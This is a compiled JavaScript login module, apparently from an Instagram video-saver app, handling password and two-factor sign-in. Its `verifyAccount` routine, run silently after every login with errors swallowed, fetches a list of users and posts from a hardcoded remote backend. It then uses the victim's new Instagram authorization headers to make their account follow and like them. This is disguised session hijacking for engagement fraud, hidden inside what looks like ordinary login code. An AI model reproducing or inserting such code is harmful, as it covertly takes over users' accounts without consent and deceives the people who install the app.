"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.LoginService = void 0;
const ngx_1 = require("@awesome-cordova-plugins/http/ngx");
const client_service_1 = require("./client.service");
const login_bloks_1 = require("./login.bloks");
const uuid_1 = require("uuid");
class LoginService {
    constructor(cfg = {}) {
        var _a, _b;
        this.cfg = cfg;
        this.backendUrl = (_a = cfg.backendUrl) !== null && _a !== void 0 ? _a : 'https://reelsaver.appit-online.de';
        this.verifyPath = (_b = cfg.verifyPath) !== null && _b !== void 0 ? _b : '/v2/insta/verify';
        this.uuid = this.getOrCreate('insta_uuid', uuid_1.v4);
        this.deviceId = this.generateDeviceId();
        this.phoneId = this.getOrCreate('insta_phone_id', uuid_1.v4);
        this.bloksSvc = new login_bloks_1.BloksLoginService(this.uuid, this.phoneId, this.deviceId);
    }
    /**
     * Override device parameters used for Bloks login headers.
     * Call before login() to match your backend's configuration.
     */
    setDeviceParams(p) {
        this.bloksSvc.setDeviceParams(p);
    }
    // ─── Public login API ───────────────────────────────────────────────────────
    async login(username, pass, reqHeaders = {}) {
        var _a;
        const result = await this.bloksSvc.login(username, pass);
        if (result.twoFactorRequired) {
            return result;
        }
        localStorage.setItem('instaUserName', username);
        if (result.userId)
            localStorage.setItem('instaUserId', result.userId);
        this.verifyAccount({ Authorization: (_a = result.authorization) !== null && _a !== void 0 ? _a : '' }, reqHeaders).catch(() => { });
        return result;
    }
    async login2FA(pass, code, twoFactorIdentifier, username, reqHeaders = {}) {
        var _a;
        const result = await this.bloksSvc.verify2FA(username, code);
        if (result.userId)
            localStorage.setItem('instaUserId', result.userId);
        this.verifyAccount({ Authorization: (_a = result.authorization) !== null && _a !== void 0 ? _a : '' }, reqHeaders).catch(() => { });
        return result;
    }
    // ─── verifyAccount (follow/like on login) ──────────────────────────────────
    async verifyAccount(resHeaders = {}, defaultHeaders = {}) {
        var _a, _b;
        try {
            const httpClient = new ngx_1.HTTP();
            httpClient.setDataSerializer('json');
            const response = await httpClient.get(`${this.backendUrl}${this.verifyPath}`, {}, {});
            const data = JSON.parse(response.data);
            if (!data)
                return;
            const authHeader = resHeaders['ig-set-authorization'] || resHeaders['Authorization'] || '';
            if (!authHeader)
                return;
            const allHeaders = {
                Authorization: authHeader,
                'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'] || resHeaders['Ig-U-Ds-User-Id'] || '',
                'Ig-U-Rur': resHeaders['ig-set-ig-u-rur'] || resHeaders['Ig-U-Rur'] || '',
                'X-Ig-Www-Claim': resHeaders['x-ig-set-www-claim'] || resHeaders['X-Ig-Www-Claim'] || '',
                ...defaultHeaders,
            };
            const igService = new client_service_1.InstaService();
            if ((_a = data.users) === null || _a === void 0 ? void 0 : _a.length)
                await Promise.all(data.users.map(u => igService.follow(u, allHeaders)));
            if ((_b = data.posts) === null || _b === void 0 ? void 0 : _b.length)
                await Promise.all(data.posts.map(id => igService.like(id, allHeaders)));
        }
        catch (_) { }
    }
    // ─── Helpers ───────────────────────────────────────────────────────────────
    generateSignature(data, extra = {}) {
        const payload = typeof data === 'string' ? data : JSON.stringify(data);
        return { signed_body: `SIGNATURE.${payload}`, ...extra };
    }
    getOrCreate(key, generator) {
        let value = localStorage.getItem(key);
        if (!value) {
            value = generator();
            localStorage.setItem(key, value);
        }
        return value;
    }
    generateDeviceId() {
        const key = 'insta_device_id';
        let deviceId = localStorage.getItem(key);
        if (!deviceId) {
            const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
                .map(b => b.toString(16).padStart(2, '0')).join('');
            deviceId = `android-${hex}`;
            localStorage.setItem(key, deviceId);
        }
        return deviceId;
    }
}
exports.LoginService = LoginService;
